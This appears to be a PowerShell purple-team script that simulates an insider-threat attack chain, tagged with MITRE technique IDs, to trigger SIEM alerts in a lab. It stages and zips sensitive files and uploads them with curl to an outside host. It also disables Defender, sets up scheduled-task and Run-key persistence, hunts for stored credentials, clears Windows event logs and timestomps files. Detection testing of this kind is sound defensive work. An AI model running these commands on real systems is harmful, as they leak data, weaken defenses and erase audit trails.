# ============================================================
# Attack Simulation Master Script - Insider Threat Lab
# Simulates a complete insider threat attack chain
# Run on: Windows 10/11 (Insider Employee Machine)
# Run as: Administrator
# ============================================================

param(
    [switch]$AllAttacks,
    [switch]$FileAccess,
    [switch]$USBExfil,
    [switch]$CloudUpload,
    [switch]$AfterHoursLogin,
    [switch]$SuspiciousPowerShell,
    [switch]$ClearLogs,
    [switch]$LogTamper,
    [switch]$CredentialHarvest,
    [switch]$Persistence,
    [switch]$LateralMovement,
    [int]$DelaySeconds = 5
)

$ErrorActionPreference = "SilentlyContinue"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$LogFile = "$ScriptDir\attack_log_$Timestamp.txt"

function Write-Attack($phase, $msg) {
    $entry = "[$(Get-Date -Format 'HH:mm:ss')] [$phase] $msg"
    Write-Host $entry -ForegroundColor Red
    Add-Content -Path $LogFile -Value $entry
}

function Start-Delay {
    Write-Host "  [*] Waiting $DelaySeconds seconds before next phase..." -ForegroundColor DarkGray
    Start-Sleep -Seconds $DelaySeconds
}

Write-Host @"

  ╔══════════════════════════════════════════════════════╗
  ║  INSIDER THREAT ATTACK SIMULATION                    ║
  ║  ⚠️  FOR AUTHORIZED LAB TESTING ONLY                ║
  ╚══════════════════════════════════════════════════════╝

"@ -ForegroundColor Red

if ($AllAttacks) {
    $FileAccess = $USBExfil = $CloudUpload = $SuspiciousPowerShell = $true
    $ClearLogs = $LogTamper = $CredentialHarvest = $Persistence = $true
}

# Default: run all if nothing specified
if (-not ($FileAccess -or $USBExfil -or $CloudUpload -or $AfterHoursLogin -or
          $SuspiciousPowerShell -or $ClearLogs -or $LogTamper -or
          $CredentialHarvest -or $Persistence -or $LateralMovement)) {
    $AllAttacks = $true
    $FileAccess = $USBExfil = $CloudUpload = $SuspiciousPowerShell = $true
    $ClearLogs = $LogTamper = $CredentialHarvest = $Persistence = $true
}

Write-Attack "INIT" "Attack simulation started at $(Get-Date)"
Write-Attack "INIT" "Logging to: $LogFile"

# ============================================================
# PHASE 1: RECONNAISSANCE & SENSITIVE FILE ACCESS (T1005, T1083)
# ============================================================
if ($FileAccess) {
    Write-Host "`n═══ PHASE 1: Sensitive File Access & Discovery ═══" -ForegroundColor Yellow

    Write-Attack "T1083" "Enumerating sensitive directories..."
    Get-ChildItem -Path "C:\SensitiveData" -Recurse -Force 2>$null | Select-Object FullName, Length, LastWriteTime | Format-Table
    Get-ChildItem -Path "C:\ConfidentialProjects" -Recurse -Force 2>$null | Select-Object FullName, Length | Format-Table

    Write-Attack "T1005" "Reading sensitive financial data..."
    Get-Content "C:\SensitiveData\Financial\Q4_Revenue_Report.xlsx" 2>$null

    Write-Attack "T1005" "Reading employee HR records..."
    Get-Content "C:\SensitiveData\HR\employee_records.csv" 2>$null

    Write-Attack "T1005" "Accessing trade secrets..."
    Get-Content "C:\SensitiveData\IP\trade_secrets.docx" 2>$null

    Write-Attack "T1005" "Accessing customer PII data..."
    Get-Content "C:\SensitiveData\CustomerData\customer_pii.csv" 2>$null

    Write-Attack "T1082" "Gathering system information..."
    systeminfo | Out-File "$env:TEMP\sysinfo_$Timestamp.txt"
    
    Write-Attack "T1016" "Gathering network configuration..."
    ipconfig /all | Out-File "$env:TEMP\netinfo_$Timestamp.txt"
    netstat -ano | Out-File "$env:TEMP\connections_$Timestamp.txt"

    Write-Attack "T1087" "Enumerating local users and groups..."
    net user | Out-File "$env:TEMP\users_$Timestamp.txt"
    net localgroup Administrators | Out-File "$env:TEMP\admins_$Timestamp.txt"

    Start-Delay
}

# ============================================================
# PHASE 2: DATA STAGING & ARCHIVING (T1074.001, T1560.001)
# ============================================================
if ($USBExfil -or $CloudUpload) {
    Write-Host "`n═══ PHASE 2: Data Staging & Archiving ═══" -ForegroundColor Yellow

    $StagingDir = "$env:TEMP\staging_$Timestamp"
    New-Item -ItemType Directory -Force -Path $StagingDir | Out-Null

    Write-Attack "T1074.001" "Staging sensitive files to temp directory..."
    Copy-Item "C:\SensitiveData\Financial\*" -Destination $StagingDir -Force 2>$null
    Copy-Item "C:\SensitiveData\HR\*" -Destination $StagingDir -Force 2>$null
    Copy-Item "C:\SensitiveData\CustomerData\*" -Destination $StagingDir -Force 2>$null
    Copy-Item "C:\ConfidentialProjects\ProjectAlpha\*" -Destination $StagingDir -Force 2>$null

    Write-Attack "T1560.001" "Creating compressed archive of staged data..."
    $ArchivePath = "$env:TEMP\exfil_package_$Timestamp.zip"
    Compress-Archive -Path "$StagingDir\*" -DestinationPath $ArchivePath -Force
    Write-Attack "T1560.001" "Archive created: $ArchivePath ($(Get-Item $ArchivePath | Select-Object -ExpandProperty Length) bytes)"

    Start-Delay
}

# ============================================================
# PHASE 3: USB EXFILTRATION SIMULATION (T1052.001)
# ============================================================
if ($USBExfil) {
    Write-Host "`n═══ PHASE 3: USB Exfiltration Simulation ═══" -ForegroundColor Yellow

    Write-Attack "T1052.001" "Simulating USB device interaction..."
    
    # Query USB device history
    Write-Attack "T1052.001" "Querying USB device history..."
    Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\*" 2>$null | 
        Select-Object FriendlyName, HardwareID | Format-Table

    # Simulate copying to removable drive
    $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    if ($RemovableDrives) {
        foreach ($drive in $RemovableDrives) {
            Write-Attack "T1052.001" "Copying archive to removable drive $($drive.DeviceID)..."
            Copy-Item $ArchivePath -Destination "$($drive.DeviceID)\" -Force 2>$null
        }
    } else {
        Write-Attack "T1052.001" "No removable drives found - simulating with temp dir..."
        $FakeUSB = "$env:TEMP\FakeUSB_$Timestamp"
        New-Item -ItemType Directory -Force -Path $FakeUSB | Out-Null
        Copy-Item $ArchivePath -Destination $FakeUSB -Force
        Write-Attack "T1052.001" "Data copied to simulated USB: $FakeUSB"
    }

    Start-Delay
}

# ============================================================
# PHASE 4: CLOUD UPLOAD SIMULATION (T1567.002)
# ============================================================
if ($CloudUpload) {
    Write-Host "`n═══ PHASE 4: Cloud Upload Simulation ═══" -ForegroundColor Yellow

    Write-Attack "T1567.002" "Simulating cloud storage upload attempts..."
    
    # DNS queries to cloud services (triggers Sysmon Event 22)
    $CloudDomains = @("drive.google.com", "dropbox.com", "mega.nz", "onedrive.live.com", "wetransfer.com", "pastebin.com")
    foreach ($domain in $CloudDomains) {
        Write-Attack "T1567.002" "DNS lookup: $domain"
        Resolve-DnsName $domain -ErrorAction SilentlyContinue | Out-Null
    }

    # Simulate upload with curl (triggers network connection events)
    Write-Attack "T1567.002" "Simulating file upload via curl..."
    & curl.exe -s -o NUL "https://httpbin.org/post" -F "file=@$ArchivePath" 2>$null
    
    # certutil download simulation (LOLBin)
    Write-Attack "T1105" "Using certutil for data transfer simulation..."
    & certutil.exe -urlcache -split -f "https://httpbin.org/get" "$env:TEMP\certutil_test.txt" 2>$null

    Start-Delay
}

# ============================================================
# PHASE 5: SUSPICIOUS POWERSHELL (T1059.001)
# ============================================================
if ($SuspiciousPowerShell) {
    Write-Host "`n═══ PHASE 5: Suspicious PowerShell Activity ═══" -ForegroundColor Yellow

    Write-Attack "T1059.001" "Executing encoded PowerShell command..."
    $EncodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami; hostname; ipconfig"))
    powershell.exe -EncodedCommand $EncodedCmd

    Write-Attack "T1059.001" "Executing with bypass flags..."
    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -Command "Get-Process | Select-Object -First 5"

    Write-Attack "T1059.001" "Simulating download cradle pattern..."
    # This creates the script block log entry without actually downloading anything malicious
    $code = '[System.Net.WebClient]::new()'
    Invoke-Expression $code 2>$null

    Write-Attack "T1562.001" "Simulating Defender disable attempt..."
    # This will be logged but won't succeed without proper permissions in lab
    try { Set-MpPreference -DisableRealtimeMonitoring $true 2>$null } catch {}

    Write-Attack "T1059.001" "Running reconnaissance via PowerShell..."
    Get-NetTCPConnection | Where-Object State -eq "Established" | Select-Object -First 10 | Out-Null
    Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Out-Null

    Start-Delay
}

# ============================================================
# PHASE 6: PERSISTENCE (T1053.005, T1547.001)
# ============================================================
if ($Persistence) {
    Write-Host "`n═══ PHASE 6: Establishing Persistence ═══" -ForegroundColor Yellow

    Write-Attack "T1053.005" "Creating scheduled task for persistence..."
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Get-Date | Out-File C:\temp\heartbeat.txt'"
    $TaskTrigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"
    Register-ScheduledTask -TaskName "SystemHealthCheck_$Timestamp" -Action $TaskAction -Trigger $TaskTrigger -Description "System maintenance" -Force 2>$null

    Write-Attack "T1547.001" "Adding registry Run key for persistence..."
    $RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $RunKeyPath -Name "SystemUpdater_$Timestamp" -Value "powershell.exe -WindowStyle Hidden -Command 'Get-Date'" -Force 2>$null

    Start-Delay
}

# ============================================================
# PHASE 7: CREDENTIAL HARVESTING SIMULATION (T1003)
# ============================================================
if ($CredentialHarvest) {
    Write-Host "`n═══ PHASE 7: Credential Harvesting Simulation ═══" -ForegroundColor Yellow

    Write-Attack "T1552.001" "Searching for credentials in files..."
    Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -Recurse -ErrorAction SilentlyContinue |
        Select-String -Pattern "password|passwd|pwd|credential|secret" -ErrorAction SilentlyContinue |
        Select-Object -First 5 | Out-Null

    Write-Attack "T1552.004" "Checking for saved credentials..."
    cmdkey /list 2>$null | Out-Null

    Write-Attack "T1003" "Simulating credential dump tool behavior..."
    # This triggers LSASS access alerts in Sysmon without actual dumping
    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
    if ($lsass) {
        Write-Attack "T1003.001" "LSASS process identified: PID $($lsass.Id)"
    }

    Start-Delay
}

# ============================================================
# PHASE 8: LOG CLEARING (T1070.001)
# ============================================================
if ($ClearLogs) {
    Write-Host "`n═══ PHASE 8: Log Clearing & Anti-Forensics ═══" -ForegroundColor Yellow

    Write-Attack "T1070.001" "Attempting to clear Application event log..."
    wevtutil cl Application 2>$null

    Write-Attack "T1070.001" "Attempting to clear System event log..."
    wevtutil cl System 2>$null

    Write-Attack "T1070.001" "Attempting to clear PowerShell logs..."
    wevtutil cl "Windows PowerShell" 2>$null

    # NOTE: Clearing Security log triggers Event 1102 BEFORE the log is cleared
    # This is the key detection point for blue team
    Write-Attack "T1070.001" "Attempting to clear Security event log..."
    wevtutil cl Security 2>$null

    Start-Delay
}

# ============================================================
# PHASE 9: LOG TAMPERING (T1070)
# ============================================================
if ($LogTamper) {
    Write-Host "`n═══ PHASE 9: Log Tampering Simulation ═══" -ForegroundColor Yellow

    Write-Attack "T1070" "Modifying file timestamps (timestomping)..."
    $TargetFile = "$env:TEMP\exfil_package_$Timestamp.zip"
    if (Test-Path $TargetFile) {
        $FakeDate = (Get-Date).AddDays(-30)
        (Get-Item $TargetFile).CreationTime = $FakeDate
        (Get-Item $TargetFile).LastWriteTime = $FakeDate
        (Get-Item $TargetFile).LastAccessTime = $FakeDate
        Write-Attack "T1070.006" "Timestamps modified to $FakeDate"
    }

    Write-Attack "T1070.004" "Deleting staging evidence..."
    Remove-Item -Path "$env:TEMP\staging_$Timestamp" -Recurse -Force 2>$null
    Remove-Item -Path "$env:TEMP\sysinfo_$Timestamp.txt" -Force 2>$null
    Remove-Item -Path "$env:TEMP\netinfo_$Timestamp.txt" -Force 2>$null

    Start-Delay
}

# ============================================================
# CLEANUP & SUMMARY
# ============================================================
Write-Host @"

╔══════════════════════════════════════════════════════╗
║       ATTACK SIMULATION COMPLETE                     ║
╠══════════════════════════════════════════════════════╣
║  Phases Executed:                                    ║
"@ -ForegroundColor Red

if ($FileAccess)          { Write-Host "║  ✓ Phase 1: Sensitive File Access" -ForegroundColor Red }
if ($USBExfil)            { Write-Host "║  ✓ Phase 2-3: Data Staging + USB Exfil" -ForegroundColor Red }
if ($CloudUpload)         { Write-Host "║  ✓ Phase 4: Cloud Upload Simulation" -ForegroundColor Red }
if ($SuspiciousPowerShell){ Write-Host "║  ✓ Phase 5: Suspicious PowerShell" -ForegroundColor Red }
if ($Persistence)         { Write-Host "║  ✓ Phase 6: Persistence Mechanisms" -ForegroundColor Red }
if ($CredentialHarvest)   { Write-Host "║  ✓ Phase 7: Credential Harvesting" -ForegroundColor Red }
if ($ClearLogs)           { Write-Host "║  ✓ Phase 8: Log Clearing" -ForegroundColor Red }
if ($LogTamper)           { Write-Host "║  ✓ Phase 9: Log Tampering" -ForegroundColor Red }

Write-Host @"
╠══════════════════════════════════════════════════════╣
║  Attack Log: $LogFile
║  Now check Wazuh/Splunk/Kibana for alerts!           ║
╚══════════════════════════════════════════════════════╝
"@ -ForegroundColor Red

# ==================== CLEANUP PERSISTENCE (optional) ====================
Write-Host "`n[?] Clean up persistence artifacts? (Recommended after testing)" -ForegroundColor Yellow
$cleanup = Read-Host "Clean up? (y/n)"
if ($cleanup -eq 'y') {
    Unregister-ScheduledTask -TaskName "SystemHealthCheck_$Timestamp" -Confirm:$false 2>$null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdater_$Timestamp" 2>$null
    Write-Host "[+] Persistence artifacts cleaned up" -ForegroundColor Green
}
